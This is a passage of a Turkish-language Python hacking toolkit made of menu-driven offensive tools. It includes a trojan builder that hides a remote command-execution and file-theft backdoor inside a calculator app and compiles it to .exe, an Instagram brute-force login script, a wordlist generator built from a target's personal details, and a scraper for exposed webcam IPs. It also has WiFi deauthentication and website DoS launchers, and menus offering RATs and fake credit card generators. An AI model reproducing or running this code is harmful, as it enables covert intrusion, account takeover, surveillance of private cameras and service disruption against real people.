        button_1 = tk.Button(root, text="1", padx=40, pady=20, command=lambda: button_click(1))
        button_2 = tk.Button(root, text="2", padx=40, pady=20, command=lambda: button_click(2))
        button_3 = tk.Button(root, text="3", padx=40, pady=20, command=lambda: button_click(3))
        button_4 = tk.Button(root, text="4", padx=40, pady=20, command=lambda: button_click(4))
        button_5 = tk.Button(root, text="5", padx=40, pady=20, command=lambda: button_click(5))
        button_6 = tk.Button(root, text="6", padx=40, pady=20, command=lambda: button_click(6))
        button_7 = tk.Button(root, text="7", padx=40, pady=20, command=lambda: button_click(7))
        button_8 = tk.Button(root, text="8", padx=40, pady=20, command=lambda: button_click(8))
        button_9 = tk.Button(root, text="9", padx=40, pady=20, command=lambda: button_click(9))
        button_0 = tk.Button(root, text="0", padx=40, pady=20, command=lambda: button_click(0))

        button_add = tk.Button(root, text="+", padx=39, pady=20, command=button_add)
        button_subtract = tk.Button(root, text="-", padx=41, pady=20, command=button_subtract)
        button_multiply = tk.Button(root, text="*", padx=41, pady=20, command=button_multiply)
        button_divide = tk.Button(root, text="/", padx=41, pady=20, command=button_divide)

        button_equal = tk.Button(root, text="=", padx=91, pady=20, command=button_equal)
        button_clear = tk.Button(root, text="Clear", padx=79, pady=20, command=button_clear)

        # Butonların konumları
        button_1.grid(row=3, column=0)
        button_2.grid(row=3, column=1)
        button_3.grid(row=3, column=2)

        button_4.grid(row=2, column=0)
        button_5.grid(row=2, column=1)
        button_6.grid(row=2, column=2)

        button_7.grid(row=1, column=0)
        button_8.grid(row=1, column=1)
        button_9.grid(row=1, column=2)

        button_0.grid(row=4, column=0)
        button_clear.grid(row=4, column=1, columnspan=2)

        button_add.grid(row=5, column=0)
        button_equal.grid(row=5, column=1, columnspan=2)

        button_subtract.grid(row=6, column=0)
        button_multiply.grid(row=6, column=1)
        button_divide.grid(row=6, column=2)

        root.mainloop()

    # İkinci kod parçası: Sunucu kodu
    def run_server():
        host = '{host}'
        port = {port}

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((host, port))

        server_socket.listen(1)  # Bağlantıları dinle

        conn, addr = server_socket.accept()
        print("Connected from: " + str(addr))

        while True:
            data = conn.recv(1024).decode()
            print(data)

            if data == "exit":  # Eğer 'exit' mesajı alınırsa döngüden çık
                break

            if data.startswith("ip"):
                result = s.run("ip a", shell=True, capture_output=True)
                response_data = result.stdout
            elif data.startswith("get"):
                # Dosya adını alın
                file_name = data.split()[1]
                try:
                    # Dosyanın içeriğini okuyun ve istemciye gönderin
                    with open(file_name, 'r') as file:
                        response_data = file.read().encode()
                except FileNotFoundError:
                    response_data = "Dosya bulunamadı.".encode()
            else:
                result = s.run(data, stdout=s.PIPE, shell=True)
                if result.stdout.decode() != "":
                    response_data = result.stdout
                elif data.startswith("aç"):
                    dosya_adi = data[3:]
                    try:
                        with open(dosya_adi, 'r') as dosya:
                            response_data = dosya.read().encode()
                    except FileNotFoundError:
                        response_data = "Dosya bulunamadı.".encode()
                elif data.startswith("çalıştır"):
                    komut = data[9:]
                    try:
                        result = s.run(komut, stdout=s.PIPE, stderr=s.PIPE, shell=True)
                        if result.returncode == 0:
                            response_data = result.stdout
                        else:
                            response_data = result.stderr
                    except Exception as e:
                        response_data = str(e).encode()
                else:
                    response_data = "Command Error".encode()

            conn.send(response_data)

        conn.close()
        server_socket.close()

    # Her iki kodu da ayrı thread'lerde çalıştıralım
    calculator_thread = threading.Thread(target=run_calculator)
    server_thread = threading.Thread(target=run_server)

    # Thread'leri başlat
    calculator_thread.start()
    server_thread.start()
    '''

    with open("sen.py", "w") as dosya:
        dosya.write(sen)

    with open("o.py","w") as dosya1:
        dosya1.write(o)

    print("Bizi tercih ettiğiniz için teşekkürler\ntrojen'i yedirmede bol şans")

    print("trojen'i exeye çevirmek için 1 çıkmak için 1 dışında herhangi bir tuşa basın...")
    a = int(input(""))
    if a == 1:
        subprocess.run(["pyinstaller", "--onefile", "sen.py"], check=True)
        subprocess.run(["pyinstaller", "--onefile", "o.py"], check=True)
        print("Dosya başarıyla .exe'ye dönüştürüldü!")
    else:
        quit()

def webTarama():

    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    driver = webdriver.Chrome(options=options)


    a = input("Aratılacak siteyi girin [https://example.com] : ")
    while not (a.startswith("http://") or a.startswith("https://")):
        print("Geçersiz URL, lütfen tekrar deneyin.")
        a = input("Aratılacak siteyi girin [https://example.com] : ")


    driver.get(a)


    clickable_elements = WebDriverWait(driver, 10).until(
        EC.visibility_of_all_elements_located((By.XPATH, "//a[@href] | //button"))
    )


    for element in clickable_elements:
        print(f"Text: {element.text},\nURL: {element.get_attribute('href')}")

    driver.quit()

def ipToİnformation():
    t.sleep(5)
    def check(): 
        r = requests.get("https://ipinfo.io/") 
        if r.status_code == 200: 
            print("\n[+] Sunucu Çevrimiçi!\n") 
        else: 
            print("\n[!] Sunucu Çevrimdışı!\n")
            exit()
    def get_device_name(ip):
        try:
            host_name = socket.gethostbyaddr(ip)
            return host_name[0]
        except socket.herror:
            return "Belirtilen IP adresi geçersiz veya cihaz adı bulunamadı."
    ip = input("Lütfen hedef ip giriniz: ") 
    check() 
    country = requests.get("https://ipinfo.io/{}/country/".format(ip)).text 
    city = requests.get("https://ipinfo.io/{}/city/".format(ip)).text 
    region = requests.get("https://ipinfo.io/{}/region/".format(ip)).text
    postal = requests.get("https://ipinfo.io/{}/postal/".format(ip)).text
    timezone = requests.get("https://ipinfo.io/{}/timezone/".format(ip)).text
    orgination = requests.get("https://ipinfo.io/{}/org/".format(ip)).text
    location =  requests.get("https://ipinfo.io/{}/loc/".format(ip)).text
    device_name = get_device_name(ip)

    print("İp: "+ip)
    print("Ülke: "+country)
    print("Şehir: "+city)
    print("Bölge: "+region)
    print("Posta Kodu: "+postal)
    print("Zaman Dilimi: "+timezone)
    print("Organizasyon: "+orgination)
    print("Lokasyon: "+location)
    print("Cihaz Adı: "+ device_name)

def wordlistOluşturucu():
    t.sleep(5)

    def generate_passwords(user_info, include_numbers=False):

        for r in range(1, len(user_info) + 1):
            for combination in itertools.permutations(user_info, r):
                password = ''.join(combination)
                yield password

                if include_numbers:
                    for number in range(10):
                        password_with_number = password + str(number)
                        yield password_with_number
    def save_passwords(passwords, output_file):
        with open(output_file, 'w', encoding='utf-8') as file:
            for password in passwords:
                file.write(password + '\n')

    name = input("Hedef kişinin adı: ")
    surname = input("Hedef kişinin soyadı: ")
    birth_year = input("Hedef kişinin doğduğu yıl: ")
    birth_month = input("Hedef kişinin doğduğu ay: ")
    birth_day = input("Hedef kişinin doğduğu gün: ")
    spouse_name = input("Hedef kişinin eşinin adı: ")
    spouse_surname = input("Hedef kişinin eşinin soyadı: ")
    pet_name = input("Hedef kişinin evcil hayvanının adı: ")
    hometown = input("Hedef kişinin memleketi: ")
    homeplak = input("Hedef kişinin memleketinin plaka kodu: ")
    onm = input("Hedef kişinin önem verdiği bir kelime: ")

    include_numbers_input = input("Sayı kombinasyonlarını eklemek ister misiniz? (Evet/Hayır): ")
    include_numbers = include_numbers_input.lower() == 'evet'

    user_info = [name, surname, birth_year, birth_month, birth_day, spouse_name, spouse_surname, pet_name, hometown, homeplak, onm]

    passwords = generate_passwords(user_info, include_numbers)

    output_file = "wordlist.txt"
    save_passwords(passwords, output_file)
    print(f'Şifreler {output_file} kayıt edildi.')

def texttobin():
    text = input("Metni giriniz: ")
    binary = text_to_binary(text)
    print(binary)
    t.sleep(7)


def yazıŞifreleme():
    print("[1] Şifrele\n[2] Şifreyi çöz")
    s = int(input("Seçenek : "))
    if s == 1:
        derece = input("[1] Basit\n[2] Güçlü\nŞifreleme derecesi seçin : ")
        if derece == "1":
            text = input("Şifrelenecek yazı : ")
            print(basic_encrypt_text(text))
            t.sleep(5)
        elif derece == "2":
            text2 = input("Şifrelenecek yazı : ")
            print(encrypt_text(text2))
            t.sleep(5)
        else:
            print("Lütfen bir seçenek girin")
            t.sleep(5)
    elif s == 2:
        derece = input("[1] Basit\n[2] Güçlü\nÇözülecek şifrenin derecesi seçin \n(Not sadece bu tool ile şifrelemiş yazıları çözer): ")
        if derece == "1":
            text3 = input("Çözülecek yazı : ")
            print(basic_decrypt_text(text3))
            t.sleep(5)
        elif derece == "2":
            text4 = input("Çözülecek yazı : ")
            print(decrypt_text(text4))
            t.sleep(5)
        else:
            print("Lütfen bir seçenek girin")
            t.sleep(5)
def dosyaŞifreleme():
    def anahtar_olustur():
        anahtar = Fernet.generate_key()
        with open("anahtar.key", "wb") as dosya:
            dosya.write(anahtar)
    def anahtar_yukle():
        with open("anahtar.key", "rb") as dosya:
            anahtar = dosya.read()
        return anahtar
    def dosya_sifrele(dosya_adi, anahtar):
        fernet = Fernet(anahtar)
        with open(dosya_adi, 'rb') as dosya:
            veri = dosya.read()
        sifreli_veri = fernet.encrypt(veri)
        with open(dosya_adi, 'wb') as dosya:
            dosya.write(sifreli_veri)
    def dosya_sifresini_ac(dosya_adi, anahtar):
        fernet = Fernet(anahtar)
        with open(dosya_adi, 'rb') as dosya:
            sifreli_veri = dosya.read()
        cozulmus_veri = fernet.decrypt(sifreli_veri)
        with open(dosya_adi, 'wb') as dosya:
            dosya.write(cozulmus_veri)
    dosya_yolu = input("Dosyanın adını ve yolunu girin: ")
    islem = input("İşlemi seçin (sifrele / ac): ")
    if islem == "sifrele":
        anahtar_olustur()
        anahtar = anahtar_yukle()
        dosya_sifrele(dosya_yolu, anahtar)
        print("Dosya başarıyla şifrelendi.")
    elif islem == "ac":
        anahtar = anahtar_yukle()
        dosya_sifresini_ac(dosya_yolu, anahtar)
        print("Dosya başarıyla çözüldü.")
    else:
        print("Geçersiz işlem seçildi.")

def instagramSeleniumBf():
    from userInfo import email, password


    class Instagram:
        
        def __init__(self, email, password):
            
            self.browser = webdriver.Firefox()
            self.email = email
            self.password = password

        def signIn(self):
            self.browser.get("https://www.instagram.com/accounts/login/")
            t.sleep(3)

            dosya_yolu = "wordlist.txt"

            with open(dosya_yolu, "r") as dosya:
                satirlar = dosya.readlines()

            login_attempts = 0

            for satir in satirlar:
                kelime_adi = satir.strip()
                self.password = kelime_adi

                email_input = self.browser.find_element(By.XPATH, "//input[@name='username']")
                password_input = self.browser.find_element(By.XPATH, "//input[@name='password']")

                email_input.send_keys(self.email)
                password_input.send_keys(self.password)
                password_input.send_keys(Keys.ENTER)

                t.sleep(1 / 5)
                email_input.clear()
                password_input.clear()

                login_attempts += 1

                if login_attempts % 6 == 0:
                    print(f"Waiting for 10 seconds after {login_attempts} attempts...")
                    t.sleep(10)

    instgrm = Instagram(email, password)
    instgrm.signIn()

def dorkKameraları():
    
    url = "http://www.insecam.org/en/jsoncountries/"

    headers = CaseInsensitiveDict()
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
    headers["Cache-Control"] = "max-age=0"
    headers["Connection"] = "keep-alive"
    headers["Host"] = "www.insecam.org"
    headers["Upgrade-Insecure-Requests"] = "1"
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"


    resp = requests.get(url, headers=headers)

    data = resp.json()
    countries = data['countries']
    os.system("cls")
    print(random_renk +"""
    ╔═╗╔═╗╔╦╗
    ║  ╠═╣║║║
    ╚═╝╩ ╩╩ ╩
    \033[1;37m+-----------------------------+
    | \033[1;31m[#] \033[1;37mDeveloper : HeJo-1 |                               
    | \033[1;31m[#] \033[1;37mVersion : 1.0.0         |
    +-----------------------------+                         
    """)


    for key, value in countries.items():
        print(f""" \033[1;30m[+] \033[1;37mCountry : {value["country"]}
    \033[1;30m[+] \033[1;37mCountry Code : ({key})
    \033[1;30m[+] \033[1;37mOnline Camera\033[1;37m(\033[1;32m{value["count"]}\033[1;37m)
    +-----------------------------------+""")
        print("")



    try:
    

        country = input(" Enter the Country Code : ")
        res = requests.get(
            f"http://www.insecam.org/en/bycountry/{country}", headers=headers
        )
        last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)[0]

        for page in range(int(last_page)):
            res = requests.get(
                f"http://www.insecam.org/en/bycountry/{country}/?page={page}",
                headers=headers
            )
            find_ip = re.findall(r"http://\d+.\d+.\d+.\d+:\d+", res.text)
        
            with open(f'{country}.txt', 'w') as f:
                for ip in find_ip:
                    print("")
                    print("\033[1;30m[+] \033[1;37m", ip)
                    f.write(f'{ip}\n')
    except:
        pass
    finally:
        print("\033[1;37m")
        print('\033[37mSave File : '+country+'.txt')

        exit()

def instagram():
    import requests
    import json
    import time

    # Kullanıcıdan giriş bilgilerini alma
    username = input("Kullanıcı adınızı girin: ")
    password = input("Şifrenizi girin: ")

    # Instagram URL'leri
    LOGIN_URL = 'https://www.instagram.com/accounts/login/ajax/'
    USER_INFO_URL = 'https://www.instagram.com/web/search/topsearch/?query={}'  # GraphQL endpoint
    FOLLOW_URL = 'https://www.instagram.com/web/friendships/{}/follow/'
    UNFOLLOW_URL = 'https://www.instagram.com/web/friendships/{}/unfollow/'
    FOLLOWERS_URL = 'https://i.instagram.com/api/v1/friendships/{}/followers/?count={}'
    FOLLOWING_URL = 'https://i.instagram.com/api/v1/friendships/{}/following/?count={}'

    def login(username, password):
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest'
        })

        # Giriş sayfasını ziyaret edip CSRF token'ı al
        session.get('https://www.instagram.com/accounts/login/')
        csrf_token = session.cookies['csrftoken']

        login_data = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        session.headers.update({'X-CSRFToken': csrf_token})

        # Giriş yap
        login_resp = session.post(LOGIN_URL, data=login_data, allow_redirects=True)
        login_resp_json = login_resp.json()

        if login_resp_json.get('authenticated'):
            print(f'{username} başarıyla giriş yaptı.')
            return session
        else:
            print(f'{username} için giriş başarısız. Hata: {login_resp_json}')
            return None

    def get_user_id(session, target_username):
        user_info_resp = session.get(USER_INFO_URL.format(target_username))
        try:
            user_info_json = user_info_resp.json()
            for user in user_info_json['users']:
                if user['user']['username'] == target_username:
                    return user['user']['pk']
        except json.JSONDecodeError:
            print(f'Kullanıcı bilgileri JSON formatında alınamadı. Hata: {user_info_resp.text}')
        return None

    def get_followers(session, user_id):
        followers_resp = session.get(FOLLOWERS_URL.format(user_id, 1000))
        if followers_resp.status_code == 200:
            return followers_resp.json().get('users', [])
        return []

    def get_following(session, user_id):
        following_resp = session.get(FOLLOWING_URL.format(user_id, 1000))
        if following_resp.status_code == 200:
            return following_resp.json().get('users', [])
        return []

    def follow_user(session, user_id):
        follow_resp = session.post(FOLLOW_URL.format(user_id))
        if follow_resp.status_code == 200:
            print('Kullanıcı başarıyla takip edildi.')
        else:
            print('Kullanıcıyı takip edemedi. Hata: ', follow_resp.text)

    def unfollow_user(session, user_id):
        unfollow_resp = session.post(UNFOLLOW_URL.format(user_id))
        if unfollow_resp.status_code == 200:
            print('Kullanıcı başarıyla takipten çıkıldı.')
        else:
            print('Kullanıcıyı takipten çıkaramadı. Hata: ', unfollow_resp.text)

    # Giriş yapma
    session = login(username, password)
    if session:
        # İşlem seçeneklerini kullanıcıya sunma
        print("Yapmak istediğiniz işlemi seçin:")
        print("1 - Seni takip eden herkesi çıkar")
        print("2 - Takip ettiklerimi çıkar")
        print("3 - Belirli bir kullanıcıyı takip et")
        print("4 - Belirli bir kullanıcıyı takipten çık")

        choice = input(f"HeJo@{user}:~/SosyalMedyaTooları/İnstagram$ ")

        if choice == '1':
            # Seni takip eden herkesi çıkar
            my_user_id = get_user_id(session, username)
            followers = get_followers(session, my_user_id)
            for follower in followers:
                unfollow_user(session, follower['pk'])
                time.sleep(2)

        elif choice == '2':
            # Takip ettiklerimi çıkar
            my_user_id = get_user_id(session, username)
            following = get_following(session, my_user_id)
            for user in following:
                unfollow_user(session, user['pk'])
                time.sleep(2)

        elif choice == '3':
            target_username = input("Takip etmek istediğiniz kullanıcının adını girin: ")
            user_id = get_user_id(session, target_username)
            if user_id:
                follow_user(session, user_id)
            else:
                print(f'{target_username} için kullanıcı ID alınamadı.')

        elif choice == '4':
            target_username = input("Takipten çıkmak istediğiniz kullanıcının adını girin: ")
            user_id = get_user_id(session, target_username)
            if user_id:
                unfollow_user(session, user_id)
            else:
                print(f'{target_username} için kullanıcı ID alınamadı.')

        else:
            print("Geçersiz seçim.")


def sosyalMedyaToolları():
    print(random_renk)
    print(''' 
[1] Discord
[2] Spotify Çalma Listesi İndirici
[3] İnstagram
[98] Üst Menüye Dön
[99] Çıkış
''')
    secim = input(f"HeJo@{user}:~/SosyalMedyaTooları$ ")
    if secim == "1":
        discord()
    elif secim == "2":
        spotify()
    elif secim == "3":
        instagram()
    elif secim == "98":
        main()
    elif secim == "99":
        quit()

def webTooları():
    print(random_renk)
    print('''
[1] Dork İle Derin Arama Yapma
[2] Web Sitesindeki Tüm Tıklanabilen Elementleri Bulma
[3] Dork İle Kayıtlı Kameraları İzleme
[4] Admin Paneli Tarayıcı
[5] Site zafiyet bulucu
[98] Üst Menüye Dön
[99] Çıkış
''')
    secim = input(f"HeJo@{user}:~/WebTooları$ ")
    if secim == "1":
        dork()
    elif secim == "2":
        webTarama()
    elif secim == "3":
        dorkKameraları()
    elif secim == "4":
        adminPanelScan()
    elif secim == "5":
        sitezafitey()
    elif secim == "98":
        main()
    elif secim == "99":
        quit()
def bruderForceTooları():
    print(random_renk)
    print('''
[1] Selenium İle İnstagrak Kaba Kuvvet Saldırısı
[2] Wordlist Oluşturucu
[98] Üst Menüye Dön
[99] Çıkış
''')
    secim = input(f"HeJo@{user}:~/BruterForceTooları$ ")
    if secim == "1":
        instagramSeleniumBf()
    elif secim == "2":
        wordlistOluşturucu()
    elif secim == "98":
        main()
    elif secim == "99":
        quit()

def DoğrudanCihazaYapılanSaldırıTooları():
    print(random_renk)
    print('''
[1]Sms Boomber
[2] İp İle Bilgi Toplama
[98] Üst Menüye Dön
[99] Çıkış
''')
    secim = input(f"HeJo@{user}:~/DoğrudanCihazaYapılanSaldırıTooları$ ")
    if secim == "1":
        sms()
    elif secim == "2":
        ipToİnformation()
    elif secim == "98":
        main()
    elif secim == "99":
        quit()

def kriptolojiTooları():
    print(random_renk)
    print('''
[1] Dosya Şifreleme
[2] Yazı Şifreleme
[3] Yazıyı Binary Koduna Çevir
[98] Üst Menüye Dön
[99] Çıkış
''')
    secim = input(f"HeJo@{user}:~/KriptolojiTooları$ ")
    if secim == "1":
        dosyaŞifreleme()
    elif secim == "2":
        yazıŞifreleme()
    elif secim == "3":
        texttobin()
    elif secim == "98":
        main()
    elif secim == "99":
        quit()

def tümToolar():
    print('''
[ I ] Sosyal Medya Tooları
          |
          |-> [1] Discord Token ile giriş
          |-> [2] Discord Şifre ile ayrıntılı bilgi alma
          |-> [3] Discord Spam 
          |-> [4] Discord Bilgileri değiştirme
          |-> [5] Discord J4J Botu
          |-> [6] Spotify Çalma Listesi İndirici
          |-> [7] Instagram Seni takip eden herkesi çıkar
          |-> [8] Instagram Takip ettiklerimi çıkar
          |-> [9] Instagram Belirli bir kullanıcıyı takip et
          |-> [10] Instagram Belirli bir kullanıcıyı takipten çık

[ II ] Web Tooları
          |
          |-> [11] Dork İle Derin Arama Yapma
          |-> [12] Web Sitesindeki Tüm Tıklanabilen Elementleri Bulma
          |-> [13] Dork İle Kayıtlı Kameraları İzleme
          |-> [14] Admin Paneli Tarayıcı
          |-> [15] Site zafiyet bulucu

[ III ] Brute Force Tolları
          |
          |-> [16] Selenium İle İnstagrak Kaba Kuvvet Saldırısı
          |-> [17] Wordlist Oluşturucu

[ IV ] Doğrudan Cihaza Yapılan Saldırı Tooları
          |
          |-> [18]Sms Boomber
          |-> [19] İp İle Bilgi Toplama
          |-> [20] Tarayıcıdaki Kayıtlı Her Şeyi Alma

[ V ] Kriptoloji Tooları
          |
          |-> [21] Dosya Şifreleme
          |-> [22] Yazı Şifreleme
          |-> [23] Yazıyı Binary Koduna Çevir  

[ VI ] İstatislik
          |
          |-> [24] Kayıtlı Wifi Ağlarını ve şifrelerini Görüntüleme

[ VII ] Anonim Chat
           |
           |-> [25] HeJo Chat

[ VIII ] Rat
          |
          |-> [26] Pc Killer
          |-> [27] BackDoor Oluşturucu
          |-> [29] Telegram Bot Rat

[ IX ] Sahte İşlemler 
          |
          |-> [30] Sahte Kimlik Oluşturucu
          |-> [31] Sahte Kredi Kartı Olşturucu
[ X ] Smm Panel
          |
          |-> [32] Sosyal Medya beğeni,yorum vb. bot basma
[ XI ] Hazır Script
          |
          |-> [33] İndex.html
[ XII ] Dos
          |
          |-> [34] WiFi Dos
          |-> [35] Site Dos
''')
    sec = input("Üst menüye dönmek için Herhangi bir tuşa basın")
    if sec == "1":
        main()
def dos():
    def wifi():
    
        active_wireless_networks = []


        def check_for_essid(essid, lst):
            check_status = True


            if len(lst) == 0:
                return check_status


            for item in lst:
            
                if essid in item["ESSID"]:
                    check_status = False

            return check_status

        def printLow(Str):
            for char in Str:
                print(char, end='', flush=True)
                sleep(.01)

        for file_name in os.listdir():
        
        
            if ".csv" in file_name:
                print("There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory.")

                directory = os.getcwd()
                try:
                    os.mkdir(directory + "/backup/")
                except:
                    print("Backup folder exists.")
                timestamp = datetime.now()
                shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

        wlan_pattern = re.compile("^wlan[0-9]+")


        check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

        if len(check_wifi_result) == 0:
            print("Please connect a WiFi adapter and try again.")
            exit()
        print("The following WiFi interfaces are available:")
        for index, item in enumerate(check_wifi_result):
            print(f"{index} - {item}")


        while True:
            wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
            try:
                if check_wifi_result[int(wifi_interface_choice)]:
                    break
            except:
                print("Please enter a number that corresponds with the choices available.")


        hacknic = check_wifi_result[int(wifi_interface_choice)]


        print("WiFi adapter connected!\nNow let's kill conflicting processes:")


        kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])


        print("Putting Wifi adapter into monitored mode:")
        put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])


        discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        try:
            while True:
                subprocess.call("clear", shell=True)

                for file_name in os.listdir():
                        fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']

                        if ".csv" in file_name:
                            with open(file_name) as csv_h:
                                csv_h.seek(0)
                                csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)

                                for row in csv_reader:
                                    if row["BSSID"] == "BSSID":
                                        pass
                                    elif row["BSSID"] == "Station MAC":
                                        break
                                    elif check_for_essid(row["ESSID"], active_wireless_networks):
                                        active_wireless_networks.append(row)

                print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
                print("No |\tBSSID              |\tChannel|\tESSID                         |")
                print("___|\t___________________|\t_______|\t______________________________|")
                for index, item in enumerate(active_wireless_networks):
                    print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
                time.sleep(1)

        except KeyboardInterrupt:
            print("\nReady to make choice.")

        while True:
            choice = input("Please select a choice from above: ")
            try:
                if active_wireless_networks[int(choice)]:
                    break
            except:
                print("Please try again.")

        hackbssid = active_wireless_networks[int(choice)]["BSSID"]
        hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

        subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])
    def site():
        işletim = input("Bir işletim sistemi seçin (windows/linux) : ")
        ip = input("İp Adresi : ")
        def run_command(command, new_terminal=False, os=None):
            try:
                # Determine the operating system if not specified
                if os is None:
                    os = platform.system().lower()

                if new_terminal:
                    if os == 'windows':
                        # Windows için yeni terminalde komut çalıştır
                        command = f'start cmd /k "{command}"'
                    elif os == 'linux':
                        # Linux için yeni terminalde komut çalıştır (gnome-terminal, konsole, etc. kullanılabilir)
                        command = f'gnome-terminal -- {command}'
                    elif os == 'darwin':
                        # macOS için yeni terminalde komut çalıştır
                        command = f'osascript -e \'tell application "Terminal" to do script "{command}"\''
                    else:
                        print("Bilinmeyen işletim sistemi. Yeni terminal açma özelliği desteklenmiyor.")
                        return
                
                # Komutu çalıştır
                result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
                
                # Komutun çıktısını ve hatasını yazdır
                if result.stdout:
                    print('Çıktı:', result.stdout)
                if result.stderr:
                    print('Hata:', result.stderr)
                print('Çıkış kodu:', result.returncode)
            except subprocess.CalledProcessError as e:
                print('Komut çalıştırılırken hata oluştu:', e)
                if e.stdout:
                    print('Çıktı:', e.stdout)
                if e.stderr:
                    print('Hata:', e.stderr)
        run_command(f'python hammer.py -s {ip} -t 135', new_terminal=True, os=f'{işletim}')
    
    print('''
[1] WiFi Dos
[2] Site Dos
[98] Üst Menü
[99] Çıkış
''')
    secim = input(f"HeJo@{user}:~/Dos$ ")
    if secim == "1":
        wifi()
    elif secim == "2":
        site()
    elif secim == "98":
        main()
    elif secim == "99":
        exit()

def hazırScript():
    def index():
        kod= '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Matrix Sign-up</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            font-family: 'Courier New', monospace;
            background: linear-gradient(to right, #000000, #1a1a1a);
            color: #00ff00;
            overflow: hidden;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
        }
        .form-container {
            background: rgba(0, 0, 0, 0.8);
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
            transition: all 0.3s ease;
        }
        .form-container:hover {
            transform: scale(1.05);
        }
        input {
            display: block;
            width: 100%;
            padding: 0.5rem;
            margin: 1rem 0;
            background: transparent;
            border: none;
            border-bottom: 2px solid #00ff00;
            color: #00ff00;
            font-size: 1rem;
        }
        button {
            width: 100%;
            padding: 0.5rem;
            background: #00ff00;
            color: #000;
            border: none;
            cursor: pointer;
            font-size: 1rem;
            transition: all 0.3s ease;
        }
        button:hover {
            background: #00cc00;
        }
        .matrix-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }
        .hacked-message {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: black;
            color: #00ff00;
            font-size: 3rem;
            text-align: center;
            padding-top: 20%;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="form-container">
            <form id="signupForm">
                <button type="submit">Go To Site</button>
            </form>
        </div>
    </div>
    <canvas class="matrix-bg" id="matrix"></canvas>
    <div class="hacked-message" id="hackedMessage">
        <br>You've Been HACKED HAHAHAHAHA!
    </div>

    <script>
        // Matrix rain effect
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        
        canvas.height = window.innerHeight;
        canvas.width = window.innerWidth;
        
        const katakana = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
        const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        const numbers = '0123456789';
        
        const alphabet = katakana + latin + numbers;
        
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        
        const rainDrops = [];
        
        for (let x = 0; x < columns; x++) {
            rainDrops[x] = 1;
        }
        
        const draw = () => {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#0F0';
            ctx.font = fontSize + 'px monospace';
            
            for (let i = 0; i < rainDrops.length; i++) {
                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
                
                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    rainDrops[i] = 0;
                }
                rainDrops[i]++;
            }
        };
        
        setInterval(draw, 30);

        // Form submission
        document.getElementById('signupForm').addEventListener('submit', function(e) {
            e.preventDefault();
            document.getElementById('hackedMessage').style.display = 'block';
        });
    </script>
</body>
</html>
'''
        # Dosyayı yazıyoruz
        with open('index.html', 'w', encoding='utf-8') as f:
            f.write(kod)
        print("index.html dosyası başarıyla yazıldı.\nAÇmak içim 1 e basın")
        bas = int(input(""))
        if bas==1:
            
            # Basit bir HTTP sunucusu başlatıyoruz
            port = 8000
            with TCPServer(("", port), SimpleHTTPRequestHandler) as httpd:
                print(f"Sunucu {port} numaralı portta çalışıyor.")
                webbrowser.open(f'http://localhost:{port}/index.html')
                httpd.serve_forever()
            


    print('''
[1] İndex.html
[98] Üst Menü
[99] Çıkış
          ''')
    sec = input(f"HeJo@{user}:~/HazırScript$ ")
    if sec == "1":
        index()
    elif sec == "98":
        main()
    elif sec == "99":
        quit()
    else:
        print("Hatalı Seçim! Lütfen tekrar deneyin.")
def smm():
    def sma():
